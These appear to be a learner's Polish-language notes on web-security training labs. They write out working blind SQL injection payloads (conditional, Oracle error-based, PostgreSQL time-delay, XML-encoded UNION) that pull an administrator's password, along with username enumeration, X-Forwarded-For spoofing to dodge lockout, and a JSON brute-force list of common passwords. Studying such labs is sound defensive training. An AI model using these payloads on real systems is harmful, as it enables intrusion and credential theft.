/sYqxJ|LZC[~,9p@Z:Fdz-?X5_A4P[{7

blind sqli


SELECT tracking_id from tracking_table where trackingId ='V0R7hhGG8kfvpMSX' AND 1=1--'

SELECT tracking_id from tracking_table where trackingId ='V0R7hhGG8kfvpMSX' AND 1=0--'
 
SELECT tracking_id from tracking_table where trackingId ='V0R7hhGG8kfvpMSX' AND (select 'x' FROM users LIMIT 1)='x'--'

SELECT tracking_id from tracking_table where trackingId ='V0R7hhGG8kfvpMSX' AND (select username FROM users WHERE username='administrator')='administrator'--'

SELECT tracking_id 'V0R7hhGG8kfvpMSX' AND (select username FROM users WHERE username='administrator'AND LENGTH(password)>1)='administrator'--' snajper typ ataku numbers

hasło ma 20 liter

' AND (select substring(password,1,1) FROM users WHERE username='administrator')='a'-- atak snajpera na a, typ ataku brute forcer 
3

' AND (select substring(password,1,1) FROM users WHERE username='administrator')='a'-- atak cluster bomb na a i pierwszą jedynkę

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
3ptb5juy30xum65cqsr8

Blind SQL injection with conditional errors

370jScGFoRrIybd5 trackingid

postawić ' aby zobaczyć czy można zrobić sqli

' || (select '') || ' - nie my sql trzeba zrobić oracle
' || (select '' from dualsasaas) || ' działa, wiec jest oracle

' || (select '' from users) || ' nie działa bo moze byc kilku userów

' || (select '' from users where rownum =1) || ' -może być kilku userow, trzeba określic ilość - wychodzi ok i stół jest 

' || (select '' from users where username='administrator') || ' - teraz case expresion


' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' - PRZECHODZI

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' - konto administratora istnieje dlatego jest error

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administsdadasdasdrator') || ' jest 200 i taki user nie istnieje, przechodzi bo sql nie musiał przetwarzać funckji to char

Ustal długość hasła

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || ' wieksze niz 1
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>25) || ' mniejsze niz 25

z intrudera wiemy, że hasło ma 20 liter lub cyfr

jaka jest pierwsza litera hasła?

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1) ='a') || ' - 200 dostajemy wiec a nie jest pierwsza

trzeba użyc intrudera snajper i numbers

pierwsza lidera to 4, snajper i brute force

teraz trzeba zgadnąć kolejne 

pierwszy payload na 1 snajper i numbers 
drugi payload na a cluster bomb i brute forcer

poczekać aż hasło w burpie zostanie odgadnięte
4inwshaks3islmnk7jfn

Lab: Blind SQL injection with time delays

ciasteczko jest wrażliwe na sqli

próba opóźnienia odpowiedzi o 10 sec

' || (SELECT SLEEP(10))-- - nie mysql
' || (SELECT pg_sleep(10))-- udało się 

Lab: Blind SQL injection with time delays and information retrieval

ciasteczko jest wrażliwe na sqli


'|| pg_sleep(10)--

udało się śpi

teraz zobacz czy stół users isnieje

'|| (SELECT case when (1=1) THEN  pg_sleep(10) else pg_sleep(-1) end)--   śpi

pytania true or false

'|| (SELECT case when (username='administrator') THEN  pg_sleep(10) else pg_sleep(-1) end from users)-- czyli adminsitrator jest w user table

znowu to samo true or false

'|| (SELECT case when (username='administrator' AND LENGTH(password)>1) THEN  pg_sleep(10) else pg_sleep(-1) end from users)-- WIĘCEJ niz jedna litera w haśle


'|| (SELECT case when (username='administrator' AND LENGTH(password)>25) THEN  pg_sleep(10) else pg_sleep(-1) end from users)-- mniej niż 25 w haśle bo mamy od razu 200 ok

haslo ma 20 znaków

'|| (SELECT case when (username='administrator' AND substring(password,1,1)='a' THEN  pg_sleep(10) else pg_sleep(-1) end from users)--

atak na pierwszą 1 w password oraz a, nie wiem czy będzie coś dłuższego... z tym time delay







vvqliq02cqmbjvz7dzs1

Lab: Blind SQL injection with out-of-band interaction:

burp colaborator w opcjach burp i kliknąć w copy to clipboard i wygenerować link

wejdź w cheat sheet i próbuj dns lookup dla każdej wersji 

w oracle nawiasy na początku i na końcu, nna początku dwie ściany a na końcu dwa średniko jako koment


Lab: SQL injection with filter bypass via XML encoding

sciągnij dodatek hackvertor

możesz zaznaczyć tekst w xml i klinąć prawy  na extantion hackventor potem encode i dec_entities i dzięki temu możemy zobaczyć czy jest podatne na atak


<@hex_entities>1 UNION SELECT username || '~' || password FROM users <@/hex_entities> następnie umieścić taki kod i pojawią się użytkownicy z hasłem

administrator
93pdjpy5bqoqxnjznyt8

Authenthication

Lab: Username enumeration via different responses

wejdź na stone z logowaniem spróbuj się zalogować randomowymi danymi, wejdź w burp w html i poszukaj post/login wyślij do intrudera i clear

zaznacz nazwę użytkownika atak snajpera tryb ataku simple list i dodajemy nazwy jakie mamy, (tutaj od web academy mamy ctrl c i v) rozpocznij attak szukaj innej długości

americas login

wchodząc w tego użytkownika w response widzimy incorrect password 

zrób to samo dla hasła i zobacz hasło 

hasło andrew


Lab: Username enumeration via subtly different responses:

tak samo robimy tylko wchodzimy w options na sam doł w grip, dodajemy linijkę invalid username or password i lecimy z attakiem snajpera

username atlanta

password dragon kod 302 


Lab: Username enumeration via response timing
tak samo z html wyciągasz, wkładasz do reapetera na koniec wpisujesz X-Forwarded-for np500 po to aby ukryć swoje ip przed blokiem podczas brute forca 

następnie dodajesz w intuderze X-forwarded-for oraz nick po nicku hasło które ma ponad 100 znaków by czas odpowiedzi serwera się przedłużył i zobaczysz zmiane


username adserver

password moon

Lab: Broken brute-force protection, IP block

mamy użytkownika wiener:peter
username ofiary: carlos

możemy użyć 2 razy niepoprawnego hasła dla brute pitchforka, więc najlepiej aby przy ataku 2 nazwą z kamdydatury strony był prawidłowy login więc np 
hasło:     użytkownik:

peter      wiener
12345      carlos
peter      wiener
qwerty     carlos

itd w ataku aż zdobędziemy hasło carlosa


Lab: Username enumeration via account lock: nie da się zrobić na community eddition

Broken brute-force protection, multiple credentials per request:

zrobić intrudera po zalogowaniu. Użyć jsona ze 100 użytkownikami:
wysłać taką odpowiedź i w response kliknąć w show response in browser w nowej karcie wkleić link i gotowe

{

"username" : "carlos",
"password" : [
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
]
}


















